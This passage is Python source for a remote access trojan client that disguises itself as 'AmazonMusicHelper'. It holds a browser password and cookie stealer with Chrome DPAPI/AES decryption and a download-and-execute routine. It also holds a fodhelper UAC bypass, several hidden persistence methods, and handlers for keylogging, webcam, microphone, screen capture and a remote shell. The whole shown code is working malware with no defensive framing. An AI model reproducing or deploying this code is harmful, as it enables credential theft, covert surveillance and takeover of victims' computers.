            "local_addr": conn.get("local", ""),
            "network": "external"
        })

    # Deduplicate external hosts (keep unique IPs with port info)
    ext_by_ip = {}
    for h in info["external_hosts"]:
        ip = h["ip"]
        if ip not in ext_by_ip:
            ext_by_ip[ip] = dict(h)
            ext_by_ip[ip]["all_ports"] = []
        ext_by_ip[ip]["all_ports"].append({"port": h["port"], "service": h["service"]})
    info["external_hosts"] = list(ext_by_ip.values())

    # ── Reverse DNS lookup for external hosts ──
    old_timeout = socket.getdefaulttimeout()
    socket.setdefaulttimeout(2)  # 2s timeout per lookup
    for h in info["external_hosts"]:
        try:
            hostname = socket.gethostbyaddr(h["ip"])[0]
            h["hostname"] = hostname
            # Build URL for HTTP/HTTPS connections
            has_https = any(p["port"] == 443 for p in h.get("all_ports", []))
            has_http = any(p["port"] == 80 or p["port"] == 8080 for p in h.get("all_ports", []))
            if has_https:
                h["url"] = f"https://{hostname}"
            elif has_http:
                h["url"] = f"http://{hostname}"
            else:
                h["url"] = hostname
        except:
            # Reverse DNS failed — keep IP only
            pass
    socket.setdefaulttimeout(old_timeout)

    return info

# ── Browser Stealer ──────────────────────────────────────────────────
def _browser_steal():
    """Extract saved passwords and cookies from Chrome, Edge, Firefox."""
    results = {"chrome": {}, "edge": {}, "firefox": {}}
    localapp = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")

    # Chrome
    chrome_path = os.path.join(localapp, "Google", "Chrome", "User Data")
    if os.path.exists(chrome_path):
        results["chrome"] = _steal_chromium(chrome_path, "Chrome", localapp)
    else:
        results["chrome"] = {"error": "Chrome not found"}

    # Edge
    edge_path = os.path.join(localapp, "Microsoft", "Edge", "User Data")
    if os.path.exists(edge_path):
        results["edge"] = _steal_chromium(edge_path, "Edge", localapp)
    else:
        results["edge"] = {"error": "Edge not found"}

    # Firefox
    firefox_path = os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
    if os.path.exists(firefox_path):
        results["firefox"] = _steal_firefox(firefox_path)
    else:
        results["firefox"] = {"error": "Firefox not found"}

    return results

def _steal_chromium(base_path, name, localapp):
    """Extract passwords from Chromium-based browsers (Chrome, Edge, Brave, Opera...)."""
    result = {"passwords": [], "cookies": [], "error": None}
    try:
        for item in os.listdir(base_path):
            if not (item == "Default" or item.startswith("Profile ")): continue
            profile_path = os.path.join(base_path, item)
            login_db = os.path.join(profile_path, "Login Data")

            # Passwords
            if os.path.exists(login_db):
                temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{name.lower()}_login_{item}.db")
                try:
                    shutil.copy2(login_db, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cur = conn.cursor()
                    try:
                        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for row in cur.fetchall():
                            url, username, enc_pwd = row
                            pwd = _decrypt_chrome(enc_pwd) if (enc_pwd and HAS["crypto"]) else "[needs cryptography]"
                            result["passwords"].append({"url": url, "username": username, "password": pwd, "profile": item})
                    except Exception:
                        pass
                    conn.close()
                except Exception as e:
                    if not result.get("error"): result["error"] = str(e)
                finally:
                    try: os.remove(temp_db)
                    except: pass

            # Cookies
            for cookie_path in [os.path.join(profile_path, "Network", "Cookies"),
                                os.path.join(profile_path, "Cookies")]:
                if not os.path.exists(cookie_path): continue
                temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{name.lower()}_cookies_{item}.db")
                try:
                    shutil.copy2(cookie_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cur = conn.cursor()
                    try:
                        cur.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 200")
                        for row in cur.fetchall():
                            result["cookies"].append({"host": row[0], "name": row[1], "value": "[encrypted]", "profile": item})
                    except Exception:
                        pass
                    conn.close()
                except Exception:
                    pass
                finally:
                    try: os.remove(temp_db)
                    except: pass
                break  # only try the first existing path
    except Exception as e:
        result["error"] = str(e)
    return result

def _decrypt_chrome(encrypted_value):
    """Decrypt Chrome/Edge password using Windows DPAPI + AES-256-GCM."""
    if not encrypted_value or not isinstance(encrypted_value, bytes):
        return "[no data]"
    if len(encrypted_value) < 15 + 16:  # 3 prefix + 12 nonce + 16 tag min
        return "[too short]"
    if encrypted_value[:3] not in (b'v10', b'v20'):
        return "[unknown format " + encrypted_value[:3].decode(errors='replace') + "]"

    try:
        # Find Local State from the installed Chrome/Edge
        localapp = os.environ.get("LOCALAPPDATA", "")
        browsers = [
            os.path.join(localapp, "Google", "Chrome", "User Data"),
            os.path.join(localapp, "Microsoft", "Edge", "User Data"),
            os.path.join(localapp, "BraveSoftware", "Brave-Browser", "User Data"),
            os.path.join(localapp, "Opera Software", "Opera Stable"),
        ]

        for browser_path in browsers:
            ls_path = os.path.join(browser_path, "Local State")
            if not os.path.exists(ls_path):
                continue
            try:
                with open(ls_path, 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                encrypted_key = encrypted_key[5:]  # strip 'DPAPI'

                # DPAPI decrypt the AES key
                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [("cbData", ctypes.wintypes.DWORD),
                                ("pbData", ctypes.POINTER(ctypes.c_char))]

                pDataIn = DATA_BLOB(len(encrypted_key),
                    ctypes.cast(ctypes.create_string_buffer(encrypted_key, len(encrypted_key)), ctypes.POINTER(ctypes.c_char)))
                pDataOut = DATA_BLOB()

                if not ctypes.windll.crypt32.CryptUnprotectData(
                    ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
                    continue

                aes_key = ctypes.create_string_buffer(pDataOut.cbData)
                ctypes.memmove(aes_key, pDataOut.pbData, pDataOut.cbData)
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)

                # AES-GCM decrypt
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:]
                aesgcm = AESGCM(bytes(aes_key))
                return aesgcm.decrypt(nonce, ciphertext, None).decode('utf-8', errors='replace')
            except Exception:
                continue
    except Exception:
        pass

    return "[cannot decrypt]"

def _steal_firefox(base_path):
    """Extract saved logins from Firefox profiles."""
    result = {"passwords": [], "cookies": [], "error": None}
    try:
        for item in os.listdir(base_path):
            profile_path = os.path.join(base_path, item)
            if not os.path.isdir(profile_path): continue

            # logins.json
            logins_path = os.path.join(profile_path, "logins.json")
            if os.path.exists(logins_path):
                try:
                    with open(logins_path, 'r', encoding='utf-8') as f:
                        logins = json.load(f)
                    for entry in logins.get("logins", []):
                        result["passwords"].append({
                            "url": entry.get("hostname", ""),
                            "username": (entry.get("encryptedUsername", "") or "")[:80],
                            "password": (entry.get("encryptedPassword", "") or "")[:80],
                            "profile": item,
                            "encrypted": True
                        })
                except Exception:
                    pass

            # cookies.sqlite
            cookies_path = os.path.join(profile_path, "cookies.sqlite")
            if os.path.exists(cookies_path):
                temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"ff_cookies_{item}.db")
                try:
                    shutil.copy2(cookies_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cur = conn.cursor()
                    try:
                        cur.execute("SELECT host, name, value FROM moz_cookies LIMIT 200")
                        for row in cur.fetchall():
                            result["cookies"].append({
                                "host": row[0], "name": row[1],
                                "value": (row[2] or "")[:80], "profile": item
                            })
                    except Exception:
                        pass
                    conn.close()
                except Exception:
                    pass
                finally:
                    try: os.remove(temp_db)
                    except: pass
    except Exception as e:
        result["error"] = str(e)
    return result

def _download_exec(url, save_path=None):
    """Download a file from URL and optionally execute it."""
    try:
        import urllib.request
        if not save_path:
            save_path = os.path.join(os.environ.get("TEMP", "/tmp"), url.split("/")[-1] or "payload.exe")
        urllib.request.urlretrieve(url, save_path)
        if sys.platform == "win32" and save_path.lower().endswith((".exe",".bat",".cmd",".ps1")):
            subprocess.Popen(save_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        elif save_path.endswith(".sh") or not sys.platform.startswith("win"):
            os.chmod(save_path, 0o755)
            subprocess.Popen(save_path, shell=True)
        return True, f"Downloaded to {save_path}"
    except Exception as e: return False, str(e)

# ── File Operations ──────────────────────────────────────────────────
CFG = {"FR": None}
def _flist(path=""):
    if CFG.get("FR") and path and not str(Path(path).resolve()).startswith(str(Path(CFG["FR"]).resolve())): path = CFG["FR"]
    if not path and sys.platform == "win32":
        return {"path": "Drives", "parent": None, "items": [
            {"name": f"{chr(l)}:\\", "path": f"{chr(l)}:\\", "type": "drive", "size": 0, "modified": ""}
            for l in range(ord("A"), ord("Z")+1) if os.path.exists(f"{chr(l)}:\\")]}
    t = Path(path).resolve() if path else Path.home()
    if not t.exists(): return {"error": "Not found"}
    if t.is_file(): return {"error": "Not a dir"}
    items = []
    denied = False
    try:
        entries = list(t.iterdir())
    except PermissionError:
        denied = True
        entries = []
    except OSError:
        denied = True
        entries = []
    for e in sorted(entries, key=lambda e: (not e.is_dir(), e.name.lower())):
        try:
            s = e.stat(); items.append({"name": e.name, "path": str(e.resolve()),
                "type": "dir" if e.is_dir() else "file", "size": s.st_size if e.is_file() else 0,
                "modified": datetime.fromtimestamp(s.st_mtime).isoformat()})
        except: items.append({"name": e.name, "path": str(e.resolve()),
            "type": "dir" if e.is_dir() else "file", "size": 0, "modified": "", "inaccessible": True})
    parent = str(t.parent.resolve()) if t.parent != t else None
    result = {"path": str(t.resolve()), "parent": parent, "items": items}
    if denied:
        result["warning"] = "Partial listing - some entries may be hidden due to permissions"
    return result

def _fdel(path):
    t = Path(path).resolve()
    if not t.exists(): return False, "Not found"
    try:
        if t.is_dir(): shutil.rmtree(t)
        else: t.unlink()
        return True, "Deleted"
    except Exception as e: return False, str(e)

def _fmkdir(parent, name):
    try: Path(parent).resolve().joinpath(name).mkdir(parents=False, exist_ok=False); return True, "OK"
    except Exception as e: return False, str(e)

def _fread(path, offset=0, cs=1024*1024):
    try:
        with open(path, "rb") as f: f.seek(offset); d = f.read(cs)
        return {"data": base64.b64encode(d).decode(), "offset": offset, "size": len(d), "eof": len(d) < cs}
    except Exception as e: return {"error": str(e)}

def _fwrite(path, b64, offset=0, mode="wb"):
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, mode) as f:
            if offset: f.seek(offset)
            f.write(base64.b64decode(b64))
        return True, "ok"
    except Exception as e: return False, str(e)

# ── Auto-Updater ─────────────────────────────────────────────────────
def _check_for_update(server_url):
    """Check server for a new client version. Returns (new_version, download_url) or (None, None)."""
    try:
        import urllib.request
        check_url = server_url.rstrip("/") + "/api/client-update"
        r = urllib.request.urlopen(check_url, timeout=15)
        data = json.loads(r.read().decode())
        remote_ver = (data.get("version") or "").strip()
        download_url = (data.get("download_url") or "").strip()
        if not remote_ver or not download_url:
            log.info("No update info configured on server")
            return None, None
        if remote_ver != _VERSION:
            log.info(f"Update available: v{_VERSION} -> v{remote_ver}")
            return remote_ver, download_url
        else:
            log.info(f"Client is up to date (v{_VERSION})")
            return None, None
    except Exception as e:
        log.warning(f"Update check failed: {e}")
        return None, None

def _download_and_install(download_url, new_version):
    """Download the new .exe and stage a batch script to replace+restart."""
    try:
        import urllib.request
        pd = _pdir()
        new_exe = os.path.join(pd, f"AmazonMusicHelper_v{new_version}.exe")
        log.info(f"Downloading update from {download_url}...")
        urllib.request.urlretrieve(download_url, new_exe)
        log.info(f"Downloaded to {new_exe}")

        # Build batch script to swap and restart
        current_exe = _exepath()
        bat_path = os.path.join(os.environ.get("TEMP", pd), "rasphere_update.bat")
        with open(bat_path, "w") as f:
            f.write(f'''@echo off
chcp 65001 >nul
title RASphere Update
echo Updating RASphere client...
timeout /t 3 /nobreak >nul
echo Installing new version...
copy /y "{new_exe}" "{current_exe}" >nul 2>&1
if %errorlevel% neq 0 (
    echo Copy failed - retrying...
    timeout /t 2 /nobreak >nul
    copy /y "{new_exe}" "{current_exe}" >nul 2>&1
)
echo Cleaning up installer...
del "{new_exe}" >nul 2>&1
echo Starting new version...
start "" "{current_exe}"
del "%~f0" >nul 2>&1
exit
''')
        log.info(f"Update script written to {bat_path}")

        # Launch the batch script detached and exit
        if sys.platform == "win32":
            subprocess.Popen([bat_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
            log.info("Update script launched - exiting to apply update")
        else:
            log.error("Auto-update is Windows-only for now")
            return False
        return True
    except Exception as e:
        log.error(f"Update download/install failed: {e}")
        return False

# ── Admin / UAC Bypass ───────────────────────────────────────────────
def _is_admin():
    """Check if running with admin privileges (Windows only)."""
    try:
        if sys.platform == "win32":
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        pass
    # Unix fallback
    try:
        return os.getuid() == 0
    except:
        pass
    return False

def _fodhelper_uac_bypass(args):
    """Silent UAC bypass using fodhelper.exe (Windows 10/11).
    Creates registry keys, launches fodhelper, and exits current process.
    The elevated instance will clean up and resume."""
    if sys.platform != "win32":
        log.warning("UAC bypass is Windows-only")
        return False

    try:
        import winreg as wr
    except ImportError:
        log.error("winreg not available for UAC bypass")
        return False

    exe_path = _exepath()
    # Build elevated command: pass all current args except --elevated, add --elevated
    elevated_args = []
    i = 1
    while i < len(sys.argv):
        a = sys.argv[i]
        if a in ("--elevated", "--no-elevate", "--uninstall", "--install"):
            i += 1
            continue
        if a in ("--server", "--secret", "--id", "--reconnect"):
            elevated_args.append(a)
            if i + 1 < len(sys.argv):
                elevated_args.append(sys.argv[i + 1])
                i += 1
        else:
            elevated_args.append(a)
        i += 1
    elevated_args.append("--elevated")
    cmd = subprocess.list2cmdline([exe_path] + elevated_args)
    log.info(f"UAC bypass: relaunching as admin (fodhelper)")

    try:
        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
        # Clean up any previous keys first
        try:
            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
            wr.DeleteValue(key, "DelegateExecute")
            wr.CloseKey(key)
        except:
            pass
        key = wr.CreateKey(wr.HKEY_CURRENT_USER, reg_path)
        wr.SetValueEx(key, "", 0, wr.REG_SZ, cmd)
        wr.SetValueEx(key, "DelegateExecute", 0, wr.REG_SZ, "")
        wr.CloseKey(key)

        # Ensure ms-settings key exists
        try:
            settings_key = wr.CreateKey(wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
            wr.CloseKey(settings_key)
        except:
            pass

        # Launch fodhelper.exe (auto-elevated)
        fodhelper_path = os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32", "fodhelper.exe")
        subprocess.Popen(fodhelper_path, creationflags=subprocess.CREATE_NO_WINDOW | 0x00000008, close_fds=True)
        log.info("UAC bypass triggered - exiting current instance")
        time.sleep(0.5)
        os._exit(0)
    except Exception as e:
        log.error(f"UAC bypass failed: {e}")
        # Try to clean up
        try:
            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        return False


def _cleanup_uac_registry():
    """Remove fodhelper registry keys left by the bypass."""
    try:
        import winreg as wr
        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
        try:
            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
            try:
                wr.DeleteValue(key, "DelegateExecute")
            except:
                pass
            try:
                wr.DeleteValue(key, "")
            except:
                pass
            wr.CloseKey(key)
        except:
            pass
        # Try to delete the key itself
        try:
            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        # Clean parent keys if empty
        for p in [r"Software\Classes\ms-settings\Shell\open",
                  r"Software\Classes\ms-settings\Shell",
                  r"Software\Classes\ms-settings"]:
            try:
                wr.DeleteKey(wr.HKEY_CURRENT_USER, p)
            except:
                pass
        log.info("UAC registry cleaned up")
    except Exception as e:
        log.debug(f"UAC cleanup (non-critical): {e}")

_keepalive_stop = threading.Event()

def _keepalive_pinger(server_url):
    """Periodically ping the server health endpoint to prevent Render from sleeping."""
    import urllib.request
    health_url = server_url.rstrip("/") + "/api/health"
    while not _keepalive_stop.is_set():
        _keepalive_stop.wait(_KEEPALIVE)
        if _keepalive_stop.is_set():
            break
        try:
            urllib.request.urlopen(health_url, timeout=10)
            log.debug("Keep-alive ping OK")
        except Exception as e:
            log.debug(f"Keep-alive ping failed: {e}")

# ── Persistence ──────────────────────────────────────────────────────
def _exepath():
    if getattr(sys, 'frozen', False): return sys.executable
    return os.path.abspath(sys.argv[0])

def _pdir():
    if sys.platform == "win32":
        b = os.environ.get("APPDATA", os.path.expanduser("~"))
        p = os.path.join(b, ".amazonmusic")
    else:
        p = os.path.expanduser("~/.amazonmusic")
    os.makedirs(p, exist_ok=True)
    return p

def install_persist(url, secret, rec, cid):
    ep = _exepath(); pd = _pdir()
    dest = os.path.join(pd, "AmazonMusicHelper.exe" if sys.platform == "win32" else "amazonmusicd")
    if ep != dest:
        try: shutil.copy2(ep, dest); log.info(f"Copied: {dest}")
        except Exception as e: log.warning(f"Copy fail: {e}"); dest = ep
    ca = [dest, "--server", url or _SERVER, "--secret", secret or _SECRET, "--reconnect", str(rec or _RECON), "--no-persist"]
    if cid: ca += ["--id", cid]
    cl = subprocess.list2cmdline(ca)
    ok = False
    if sys.platform == "win32":
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "AmazonMusicHelper", 0, winreg.REG_SZ, cl); winreg.CloseKey(k); log.info("Installed: Registry"); ok = True
        except Exception as e: log.warning(f"Reg fail: {e}")
        try:
            sd = os.path.join(os.environ.get("APPDATA",""), "Microsoft","Windows","Start Menu","Programs","Startup")
            if os.path.exists(sd):
                vp = os.path.join(sd, "AmazonMusicHelper.vbs")
                with open(vp, "w") as f: f.write(f'CreateObject("WScript.Shell").Run "{cl.replace(chr(34), chr(34)+chr(34))}", 0, False')
                log.info("Installed: Startup VBS"); ok = True
        except Exception as e: log.warning(f"VBS fail: {e}")
        try:
            subprocess.run(["schtasks","/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            r = subprocess.run(["schtasks","/Create","/TN","AmazonMusicHelper","/TR",cl,"/SC","ONLOGON","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            if r.returncode == 0: log.info("Installed: Task"); ok = True
        except Exception as e: log.warning(f"Task fail: {e}")
    else:
        try:
            cline = f"@reboot {cl} > /dev/null 2>&1 &"
            ex = subprocess.run(["crontab","-l"], capture_output=True, text=True)
            ct = (ex.stdout or "")
            if "AmazonMusicHelper" not in ct:
                ct += f"\n# AmazonMusicHelper\n{cline}\n"
                subprocess.run(["crontab","-"], input=ct, text=True)
                log.info("Installed: crontab"); ok = True
        except Exception as e: log.warning(f"Cron fail: {e}")
        try:
            sd = os.path.expanduser("~/.config/systemd/user"); os.makedirs(sd, exist_ok=True)
            sc = f"[Unit]\nDescription=Amazon Music Helper\nAfter=network.target\n\n[Service]\nExecStart={cl}\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=default.target\n"
            with open(os.path.join(sd, "amazonmusic-helper.service"), "w") as f: f.write(sc)
            subprocess.run(["systemctl","--user","daemon-reload"], capture_output=True)
            subprocess.run(["systemctl","--user","enable","amazonmusic-helper"], capture_output=True)
            log.info("Installed: systemd"); ok = True
        except Exception as e: log.warning(f"systemd fail: {e}")
    return ok

def uninstall_persist():
    ok = False
    if sys.platform == "win32":
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            try: winreg.DeleteValue(k, "AmazonMusicHelper"); ok = True
            except FileNotFoundError: pass
            winreg.CloseKey(k)
        except: pass
        try:
            vp = os.path.join(os.environ.get("APPDATA",""), "Microsoft","Windows","Start Menu","Programs","Startup","AmazonMusicHelper.vbs")
            if os.path.exists(vp): os.remove(vp); ok = True
        except: pass
        try: subprocess.run(["schtasks","/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW); ok = True
        except: pass
    else:
        try:
            ex = subprocess.run(["crontab","-l"], capture_output=True, text=True)
            if ex.stdout and "AmazonMusicHelper" in ex.stdout:
                nc = "\n".join(l for l in ex.stdout.split("\n")                    if "AmazonMusicHelper" not in l)
                subprocess.run(["crontab","-"], input=nc, text=True); ok = True
        except: pass
        try:
            sp = os.path.expanduser("~/.config/systemd/user/amazonmusic-helper.service")
            if os.path.exists(sp):
                subprocess.run(["systemctl","--user","disable","amazonmusic-helper"], capture_output=True)
                os.remove(sp); subprocess.run(["systemctl","--user","daemon-reload"], capture_output=True); ok = True
        except: pass
    try:
        pd = _pdir()
        for f in os.listdir(pd):
            try: os.remove(os.path.join(pd, f))
            except: pass
        try: os.rmdir(pd)
        except: pass
    except: pass
    return ok

# ── Event Handlers ───────────────────────────────────────────────────
def setup_handlers(sio):
    sc = CapEngine(sio, "screen")
    wc = CapEngine(sio, "webcam")
    mic = MicEngine(sio)
    mon = SysMon(sio)
    term = Term(sio)
    keylog = Keylog(sio)
    state.scap = sc; state.wcap = wc; state.mic = mic; state.keylog = keylog

    @sio.on("connect")
    def _c():
        log.info("Connected"); state.conn = True
        sio.emit("client_register", {"secret": state.secret, "client_id": state.cid,
            "info": {"hostname": socket.gethostname(), "platform": sys.platform,
                "username": os.environ.get("USERNAME", os.environ.get("USER","?")),
                "features": {"screen": HAS["mss"], "input": HAS["pynput"], "clipboard": HAS["pyperclip"],
                    "audio": HAS["pycaw"], "monitor": HAS["psutil"], "terminal": True, "webcam": HAS["cv2"]}}})

    @sio.on("disconnect")
    def _d():
        _block_input(False)  # auto-unblock on disconnect
        log.info("Disconnected"); state.conn = False; state.reg = False; sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop()

    @sio.on("registration_ok")
    def _r(d): state.reg = True; state.cid = d.get("client_id", state.cid); log.info(f"Registered: {state.cid}")

    # Screen
    @sio.on("start_screen_capture")
    def _sc(d=None):
        if d and "monitor" in d: sc.monitor_idx = int(d.get("monitor", 1))
        sc.start(); sio.emit("screen_capture_status", {"active": True})
    @sio.on("stop_screen_capture")
    def _sc2(): sc.stop(); sio.emit("screen_capture_status", {"active": False})
    @sio.on("set_screen_monitor")
    def _smn(d):
        if d and "monitor" in d:
            sc.monitor_idx = int(d["monitor"])
            was_running = sc.r
            if was_running:
                sc.stop()
                sc.start()
                sio.emit("screen_capture_status", {"active": True})
    @sio.on("set_screen_quality")
    def _sq(d):
        if d:
            if "quality" in d: sc.q = max(1, min(100, int(d["quality"])))
            if "scale" in d: sc.sc = max(0.1, min(1.0, float(d["scale"])))
            if "fps" in d: sc.fps = max(1, min(30, int(d["fps"])))

    # Webcam
    @sio.on("start_webcam")
    def _wc(d=None): wc.start(); sio.emit("webcam_status", {"active": True})
    @sio.on("stop_webcam")
    def _wc2(): wc.stop(); sio.emit("webcam_status", {"active": False})
    @sio.on("set_webcam_quality")
    def _wq(d):
        if d:
            if "quality" in d: wc.q = max(1, min(100, int(d["quality"])))
            if "fps" in d: wc.fps = max(1, min(30, int(d["fps"])))

    # Microphone
    @sio.on("mic_start")
    def _mstart(d=None): mic.start()
    @sio.on("mic_stop")
    def _mstop(): mic.stop(); sio.emit("mic_status", {"active": False})

    # Keylogger
    @sio.on("keylog_start")
    def _kstart(d=None): keylog.start()
    @sio.on("keylog_stop")
    def _kstop(): keylog.stop()

    # Mouse
    @sio.on("mouse_event")
    def _me(d):
        if not HAS["pynput"] or not state.mc: return
        try:
            a = d.get("action","")
            if a == "move": state.mc.position = (int(d.get("x",0)*state.sw), int(d.get("y",0)*state.sh))
            elif a == "move_relative": state.mc.move(int(d.get("dx",0)), int(d.get("dy",0)))
            elif a == "click":
                bm = {"left": MB.left, "right": MB.right, "middle": MB.middle}
                state.mc.click(bm.get(d.get("button","left").lower(), MB.left), 2 if d.get("double") else 1)
            elif a == "press": state.mc.press({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
            elif a == "release": state.mc.release({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
            elif a == "scroll": state.mc.scroll(int(d.get("dx",0)), int(d.get("dy",0)))
        except Exception as e: log.error(f"Mouse err: {e}")

    # Keyboard
    @sio.on("keyboard_event")
    def _ke(d):
        if not HAS["pynput"] or not state.kc: return
        try:
            SP = {"ctrl": Key.ctrl, "alt": Key.alt, "shift": Key.shift, "win": Key.cmd, "cmd": Key.cmd, "super": Key.cmd,
                  "tab": Key.tab, "enter": Key.enter, "esc": Key.esc, "space": Key.space, "backspace": Key.backspace,
                  "delete": Key.delete, "home": Key.home, "end": Key.end, "page_up": Key.page_up, "page_down": Key.page_down,
                  "up": Key.up, "down": Key.down, "left": Key.left, "right": Key.right,
                  **{f"f{i}": getattr(Key, f"f{i}") for i in range(1,13)}}
            def rk(k): k = k.lower(); return SP.get(k, KeyCode.from_char(k))
            a = d.get("action","")
            if a == "press": state.kc.press(rk(d.get("key","")))
            elif a == "release": state.kc.release(rk(d.get("key","")))
            elif a == "combo":
                ks = [rk(k) for k in d.get("keys",[])]
                for k in ks: state.kc.press(k)
                for k in reversed(ks): state.kc.release(k)
            elif a == "type": state.kc.type(d.get("text",""))
            elif a == "shortcut":
                scs = {"ctrl_alt_del": ([Key.ctrl, Key.alt], Key.delete), "ctrl_shift_esc": ([Key.ctrl, Key.shift], Key.esc),
                       "alt_tab": ([Key.alt], Key.tab), "alt_f4": ([Key.alt], Key.f4),
                       "win_d": ([Key.cmd], KeyCode.from_char("d")), "win_r": ([Key.cmd], KeyCode.from_char("r")),
                       "win_e": ([Key.cmd], KeyCode.from_char("e")), "win_l": ([Key.cmd], KeyCode.from_char("l")),
                       "ctrl_c": ([Key.ctrl], KeyCode.from_char("c")), "ctrl_v": ([Key.ctrl], KeyCode.from_char("v")),
                       "ctrl_x": ([Key.ctrl], KeyCode.from_char("x")), "ctrl_z": ([Key.ctrl], KeyCode.from_char("z")),
                       "ctrl_a": ([Key.ctrl], KeyCode.from_char("a")), "ctrl_s": ([Key.ctrl], KeyCode.from_char("s"))}
                sc = scs.get(d.get("name",""))
                if sc:
                    for m in sc[0]: state.kc.press(m)
                    state.kc.press(sc[1]); state.kc.release(sc[1])
                    for m in reversed(sc[0]): state.kc.release(m)
        except Exception as e: log.error(f"Key err: {e}")

    # Terminal
    @sio.on("terminal_start")
    def _ts(): ok = term.start(); sio.emit("terminal_status", {"active": ok})
    @sio.on("terminal_input")
    def _ti(d): term.write((d or {}).get("command",""))
    @sio.on("terminal_stop")
    def _tst(): term.stop(); sio.emit("terminal_status", {"active": False})

    # Monitor
    @sio.on("start_system_monitor")
    def _sm(): mon.start(); sio.emit("monitor_status", {"active": True})
    @sio.on("stop_system_monitor")
    def _sm2(): mon.stop(); sio.emit("monitor_status", {"active": False})

    # Processes
    @sio.on("get_processes")
    def _gp(): sio.emit("process_list", {"processes": _proc()})
    @sio.on("kill_process")
    def _kp(d): pid = (d or {}).get("pid"); ok, msg = _kill(pid); sio.emit("process_kill_result", {"ok": ok, "message": msg, "pid": pid})

    # Clipboard
    @sio.on("clipboard_get")
    def _cg():
        if HAS["pyperclip"]:
            try: sio.emit("clipboard_data", {"text": pyperclip.paste()})
            except Exception as e: sio.emit("clipboard_data", {"error": str(e)})
        else: sio.emit("clipboard_data", {"error": "N/A"})
    @sio.on("clipboard_set")
    def _cs(d):
        if HAS["pyperclip"]:
            try: pyperclip.copy((d or {}).get("text","")); sio.emit("clipboard_status", {"ok": True})
            except Exception as e: sio.emit("clipboard_status", {"ok": False, "error": str(e)})
        else: sio.emit("clipboard_status", {"ok": False, "error": "N/A"})

    # Audio
    @sio.on("audio_get_volume")
    def _ag(): r = _audio(); sio.emit("audio_volume", r or {"error": "N/A"})
    @sio.on("audio_set_volume")
    def _as(d): lv = (d or {}).get("level",50); ok = _avol(int(lv)); sio.emit("audio_status", {"ok": ok, "volume": int(lv)})
    @sio.on("audio_toggle_mute")
    def _am(): ok = _amute(); r = _audio(); sio.emit("audio_volume", r or {"error": "N/A"})

    # Power
    @sio.on("power_monitor_off")
    def _pmo(): ok = _monoff(); sio.emit("power_result", {"action": "monitor_off", "ok": ok})
    @sio.on("power_lock")
    def _pl(): ok = _lock(); sio.emit("power_result", {"action": "lock", "ok": ok})
    @sio.on("power_sleep")
    def _ps(): ok = _sleep(); sio.emit("power_result", {"action": "sleep", "ok": ok})

    # NEW: Fun Commands
    @sio.on("wallpaper_set")
    def _wp(d): ok, msg = _wallpaper((d or {}).get("path","")); sio.emit("cmd_result", {"cmd": "wallpaper", "ok": ok, "message": msg})
    @sio.on("msgbox_show")
    def _mb(d): ok, msg = _msgbox((d or {}).get("title","RASphere"), (d or {}).get("text","Hello!")); sio.emit("cmd_result", {"cmd": "msgbox", "ok": ok, "message": msg})
    @sio.on("open_url")
    def _ou(d): ok, msg = _openurl((d or {}).get("url","")); sio.emit("cmd_result", {"cmd": "openurl", "ok": ok, "message": msg})
    @sio.on("take_screenshot")
    def _tss(): data, fmt = _screenshot(); sio.emit("screenshot_result", {"data": data, "format": fmt} if data else {"error": fmt})
    @sio.on("get_geoip")
    def _geo(): sio.emit("geoip_result", _geoip())
    @sio.on("get_apps")
    def _ga(): sio.emit("apps_result", {"apps": _apps()})
    @sio.on("play_sound")
    def _psnd(d): ok, msg = _play_sound((d or {}).get("freq",800), (d or {}).get("dur",1)); sio.emit("cmd_result", {"cmd": "sound", "ok": ok, "message": msg})
    @sio.on("search_files")
    def _sf(d): r = _search_files((d or {}).get("root","C:\\"), (d or {}).get("pattern","*"), (d or {}).get("max",50)); sio.emit("search_result", {"results": r})
    @sio.on("execute_command")
